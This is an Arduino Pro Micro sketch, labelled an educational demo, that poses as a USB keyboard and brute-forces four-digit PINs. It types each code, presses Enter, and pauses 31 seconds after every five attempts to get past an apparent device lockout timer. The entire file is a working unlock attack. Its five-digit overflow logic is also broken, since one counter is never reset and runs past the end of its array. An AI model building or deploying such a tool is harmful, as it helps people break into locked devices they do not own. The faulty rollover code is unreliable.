/*====================================================
 Educational Brute‑Force Logic (4‑Digit Counter Demo)
 For Arduino Pro Micro – HID Keyboard
======================================================*/

#include <Keyboard.h>

// HID keycodes for numbers 0–9 (Pro Micro uses ASCII typing)
char nums[] = {'0','1','2','3','4','5','6','7','8','9'};

// digit counters
int a = 0;  // 1st digit
int b = 0;  // 2nd digit
int c = 0;  // 3rd digit
int d = 0;  // 4th digit

int attempts = 0;       // attempts tracker
bool fiveDigitMode = false; // original code tries 5th digit after overflow
int e = 0;              // 5th digit counter

void setup() {
  Keyboard.begin();
  delay(3000); // wait for USB to enumerate
}

void loop() {

  // -----------------------------
  // After 5 incorrect attempts
  // -----------------------------
  if (attempts == 5) {
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    delay(31000); // wait 31 seconds
    attempts = 0; // reset attempt counter
  }

  // -----------------------------
  // Send digits (4 OR 5 digits)
  // -----------------------------
  if (!fiveDigitMode) {
    Keyboard.write(nums[a]);
    Keyboard.write(nums[b]);
    Keyboard.write(nums[c]);
    Keyboard.write(nums[d]);
  } else {
    Keyboard.write(nums[a]);
    Keyboard.write(nums[b]);
    Keyboard.write(nums[c]);
    Keyboard.write(nums[d]);
    Keyboard.write(nums[e]);
  }

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1200); // Wait before next attempt
  
  // increase counters
  d++;
  attempts++;

  // -----------------------------
  // Digit rollover logic
  // -----------------------------
  if (d == 10) {
    d = 0;
    c++;

    if (c == 10) {
      c = 0;
      b++;

      if (b == 10) {
        b = 0;
        a++;

        if (a == 10) {
          // move into 5‑digit mode
          fiveDigitMode = true;
          e++;

          if (e == 10) {
            e = 0;
          }
        }
      }
    }
  }
}
